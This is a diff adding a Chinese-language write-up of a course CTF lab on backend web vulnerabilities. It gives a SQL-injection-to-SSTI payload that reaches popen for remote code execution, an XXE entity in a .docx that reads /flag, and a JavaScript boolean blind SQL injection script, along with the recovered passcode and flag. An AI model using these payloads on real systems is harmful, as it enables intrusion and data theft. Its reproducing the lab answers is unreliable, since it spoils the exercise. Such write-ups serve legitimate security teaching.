@@ -1,0 +1,162 @@
+---
+title: Web Lab 3：后端漏洞基础
+---
+import Card from '@/components/md-comp/card.vue'
+
+import { NImage } from 'naive-ui'
+
+{/* xec73tmgodgmat1oil3s87ytkz3ojimd */}
+
+import PasswordContainer from '@md-components/passwordContainer.vue';
+
+<PasswordContainer md5="2e039985539dcf9fb68b684623528952">
+
+## Task 1: Being and Code (30%)
+
+<Card title="任务" type="task">
+- 完成 `Being and Code`
+  - 平台上可下载源码
+  - 本题用到的是轻量级数据库SQLite，语法和MySQL非常像
+  - 本题不会涉及到在MySQL和SQLite下有明显差异的攻击技术
+  - Flag在根目录某文件里，文件名未知
+  - 你可能需要实现有回显的RCE
+</Card>
+
+
+```python
+    query = f"SELECT username FROM users WHERE id = {id}"
+```
+
+开局先蚌埠住了
+
+可惜sqlite3不能RCE
+
+```python
+    template = '''
+        <html>
+          <head>
+            <title>SSTI</title>
+          </head>
+         <body>
+              <h3>Hello, %s !</h3>
+          </body>
+        </html>
+        '''% (name)
+    return render_template_string(template)
+```
+
+哦哦哦哦哦哦 RCE在这呢
+
+那很显然了，注id让sqlite3返回RCE payload
+
+SQLi Payload为：`http://127.0.0.1:12108/?id=-1 UNION SELECT '<SSTI Payload>'`
+
+然后是RCE，`"".__class__.__base__.__subclasses__()[155].__init__.__globals__["popen"]("<cmd>").read()`，经典的基础无builtins沙箱逃逸
+
+
+import Image1 from "./images/web3-1-solved.png?url";
+
+<NImage src={Image1} alt="web3-1-solved" width="100%" />
+
+
+## Task 2: Yes Author (35%)
+
+<Card title="任务" type="task">
+- 完成 `Yes Author`
+  - 题目只解析你上传的.docx文件
+  - 有内容的.docx文件本质是一个.zip压缩包
+  - Flag在/flag文件内
+  - 本题不需要RCE
+</Card>
+
+修改`core.xml`如下：
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///flag'>]>
+<cp:coreProperties ...>
+<cp:lastModifiedBy>&xxe;</cp:lastModifiedBy>
+...
+</cp:coreProperties>
+```
+
+import Image2 from "./images/web3-2-solved.png?url";
+
+<NImage src={Image2} alt="web3-2-solved" width="100%" />
+
+## Task 3: Passcode+ (35%)
+
+<Card title="任务" type="task">
+- 完成 `Passcode+`
+  - 本题基于MySQL
+  - 服务端有最基础的注入过滤功能
+  - `passcodes`表的`passcode`列下存储了全部的passcode，有多行数据
+  - Flag**不在**数据库中，输入正确的passcode后自动获得
+</Card>
+
+
+先基本测试一下，发现是关键词过滤。
+
+跑了一个SQLite keywords发现过滤了以下关键词：
+
+- `ABORT`
+- `AND`
+- `BEFORE`
+- `FOR`
+- `FOREIGN`
+- `IF`
+- `IGNORE`
+- `LIMIT`
+- `OR`
+- `ORDER`
+- `TEMPORARY`
+- `UNION`
+
+（好吧其实就是`OR,AND,IF,UINON,LIMIT`）
+
+然后跑了一个MySQL built-in function，发现还过滤了一个`SLEEP`
+
+那就是经典bool盲注了，payload为`1' || (SELECT ASCII(SUBSTRING(MIN(passcode),1,1)) FROM passcodes) = ${i} # --`
+
+写写码：
+
+```js
+const do_check = (word)=>fetch("http://127.0.0.1:7819/check_code.php",{
+    method: "POST",
+    body: "passcode=" + word,
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+}).then(v => v.text()).then(v => v.includes("WRONG PASSCODE"));
+
+const charcode_array_to_string = (arr) => {
+    return arr.map(c => String.fromCharCode(c)).join('');
+};
+
+(async () => {
+    const lx = []
+for(let s = 1; s < 100; s++) {
+    // console.log(`Current position: ${s}`);
+    
+    for(let i=0;i<256;i++){
+        await do_check(`1' || (SELECT ASCII(SUBSTRING(MIN(passcode),${s},1)) FROM passcodes) = ${i} # --`).then(v=>{
+            if(v){
+                // console.log(`Found: ${i}`);
+            } else {
+                // console.log(`Not found: ${i}`);
+                lx.push(i);
+                // console.log(`Current charcode array: ${charcode_array_to_string(lx)}`);
+            }
+            const progress = Math.floor(i / 256 * 16);
+            console.log(`\rProgress [${'='.repeat(progress)}${' '.repeat(16-progress)}] ${s}:${i} str: ${charcode_array_to_string(lx)}`);
+        })
+    }
+}
+})()
+```
+
+一个passcode:`3n0_3d0c55@p`
+
+flag: `AAA{90tt_wu3rf31t_nich7}`
+
+</PasswordContainer>
